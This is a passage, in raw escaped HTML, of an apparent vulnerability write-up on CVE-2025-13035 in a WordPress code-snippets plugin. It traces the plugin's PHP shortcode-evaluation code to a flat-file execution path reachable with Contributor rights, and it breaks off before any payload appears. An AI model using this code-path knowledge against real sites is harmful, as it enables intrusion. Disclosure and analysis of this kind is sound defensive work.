class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;!==&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;intval&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$atts&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;snippet_id&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;?&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;intval&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$atts&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;snippet_id&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;intval&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$atts&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;id&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;invalid_id_warning&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$snippet&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;get_snippet&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;bool&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$atts&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;network&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;html&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;Render&amp;ensp;the&amp;ensp;source&amp;ensp;code&amp;ensp;if&amp;ensp;this&amp;ensp;is&amp;ensp;not&amp;ensp;a&amp;ensp;shortcode&amp;ensp;snippet.&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;content&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;!==&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$snippet&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;scope&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$snippet&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;id&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;?&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;render_snippet_source&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$snippet&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;invalid_id_warning&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$snippet&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;id&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;...&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$content&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;evaluate_shortcode_content&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$snippet&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$original_atts&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;...&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The function creates a &lt;strong&gt;Snippet&lt;/strong&gt; object by calling &lt;code&gt;get_snippet&lt;/code&gt;, which accepts three parameters: the snippet ID, a boolean indicating whether network mode is used, and the desired format (&lt;strong&gt;html&lt;/strong&gt;). The result is a &lt;strong&gt;Snippet&lt;/strong&gt; object containing all necessary data for further processing.&lt;/p&gt;&#xA;&lt;p&gt;Next, it checks the snippet&amp;rsquo;s &lt;strong&gt;scope&lt;/strong&gt;. If the snippet is &lt;strong&gt;not&lt;/strong&gt; of type &lt;strong&gt;content&lt;/strong&gt; (&lt;code&gt;html&lt;/code&gt;)&#xA;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; href=&#34;http://localhost:1313/posts/2025-11-27-cve-2025-13035/content.png&#34; title=&#34;Content when creating Snippet&#34; data-thumbnail=&#34;/posts/2025-11-27-cve-2025-13035/content.png&#34; data-sub-html=&#34;&lt;h2&gt;Content&lt;/h2&gt;&lt;p&gt;Content when creating Snippet&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-27-cve-2025-13035/content.png&#39; alt=&#34;Content&#34; height=&#34;549&#34; width=&#34;1036&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Content when creating Snippet&lt;/figcaption&gt;&#xD;&#xA;  &lt;/figure&gt;&#xA;the plugin does not process the content and instead returns the snippet&amp;rsquo;s source code.&lt;/p&gt;&#xA;&lt;p&gt;The &lt;code&gt;evaluate_shortcode_content()&lt;/code&gt; function is called to process the shortcode content:&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;protected&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nf&#34;&gt;evaluate_shortcode_content&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;Snippet&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$snippet&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;array&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$atts&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;string&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;empty&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$atts&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;php&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$snippet&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;code&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;Snippet_Files&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;is_active&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;evaluate_shortcode_from_db&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$snippet&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$atts&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$network&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;DB&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;validate_network_param&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$snippet&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;network&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$table_name&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;Snippet_Files&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;get_hashed_table_name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;code_snippets&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;db&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;get_table_name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$network&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$filepath&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;build_snippet_flat_file_path&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$table_name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$snippet&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;file_exists&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$filepath&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;?&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;evaluate_shortcode_from_flat_file&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$filepath&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$atts&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;evaluate_shortcode_from_db&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$snippet&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$atts&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;It checks whether the &lt;code&gt;php&lt;/code&gt; attribute exists. If not, it returns the snippet&amp;rsquo;s original code without execution.&#xA;If &lt;code&gt;php&lt;/code&gt; exists but the storage file does not, it falls back to evaluating directly from the database.&lt;/p&gt;&#xA;&lt;p&gt;The storage file is declared:&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;private&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;const&lt;/span&gt;&amp;ensp;&lt;span class=&#34;no&#34;&gt;ENABLED_FLAG_FILE&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;flat-files-enabled.flag&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;To prevent the function from returning early, the administrator must enable the &amp;ldquo;Enable file-based execution&amp;rdquo; option in the admin panel:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; href=&#34;http://localhost:1313/posts/2025-11-27-cve-2025-13035/enable.png&#34; title=&#34;Enable file-based execution&#34; data-thumbnail=&#34;/posts/2025-11-27-cve-2025-13035/enable.png&#34; data-sub-html=&#34;&lt;h2&gt;Enable&lt;/h2&gt;&lt;p&gt;Enable file-based execution&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-27-cve-2025-13035/enable.png&#39; alt=&#34;Enable&#34; height=&#34;810&#34; width=&#34;982&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Enable file-based execution&lt;/figcaption&gt;&#xD;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;This creates the storage file inside &lt;code&gt;wp-content/code-snippets&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; href=&#34;http://localhost:1313/posts/2025-11-27-cve-2025-13035/file.png&#34; title=&#34;flat-files-enabled.flag created&#34; data-thumbnail=&#34;/posts/2025-11-27-cve-2025-13035/file.png&#34; data-sub-html=&#34;&lt;h2&gt;File&lt;/h2&gt;&lt;p&gt;flat-files-enabled.flag created&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-27-cve-2025-13035/file.png&#39; alt=&#34;File&#34; height=&#34;253&#34; width=&#34;561&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;flat-files-enabled.flag created&lt;/figcaption&gt;&#xD;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Once the file exists, the function determines the snippet&amp;rsquo;s network information, retrieves the hashed table name, and builds the path to the snippet content file assigned to &lt;code&gt;$filepath&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;If &lt;code&gt;$filepath&lt;/code&gt; exists, the function calls &lt;code&gt;evaluate_shortcode_from_flat_file(&amp;ensp;$filepath,&amp;ensp;$atts&amp;ensp;)&lt;/code&gt; where the vulnerability occurs.&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition info open disabled&#34;&gt;&#xD;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-circle-info&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Info&lt;/div&gt;&#xD;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;The vulnerability is published with Contributor privileges because this is the minimum level required to insert a shortcode into a post.&lt;/p&gt;&lt;/div&gt;&#xD;&#xA;  &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;pre 